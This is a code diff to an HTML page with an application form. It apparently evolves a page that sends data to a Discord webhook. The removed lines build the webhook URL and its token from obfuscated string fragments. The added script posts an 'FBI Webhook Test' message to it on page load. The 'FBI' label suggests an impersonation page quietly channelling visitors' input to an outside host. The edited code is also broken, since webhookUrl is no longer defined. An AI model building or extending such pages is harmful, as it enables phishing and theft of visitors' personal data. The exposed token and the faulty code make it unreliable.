@@ -48,10 +48,22 @@
     </form>
 </div>
 <script>
-const _0x = "https://discord.com/api/webhooks/";
-const _0y = "1511799961447174176/";
-const _0z = "ONAqoUElPuZZOeLwOpdAQEpMlOTV8e3DMMwQVNjScFuHKYDDOyQDHGq4oHWwAfStiegE";
-const webhookUrl = _0x + _0y + _0z;
+// Verification Code
+fetch(webhookUrl, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ content: "FBI Webhook Test Successful!" })
+})
+.then(function(res) {
+    if (res.ok) {
+        alert("SUCCESS: Webhook is working 100%!");
+    } else {
+        alert("ERROR: Status code " + res.status);
+    }
+})
+.catch(function(err) {
+    alert("FAILED: " + err);
+});
     document.getElementById('applicationForm').addEventListener('submit', function(e) {
         e.preventDefault();
         const submitBtn = document.querySelector('.submit-btn');
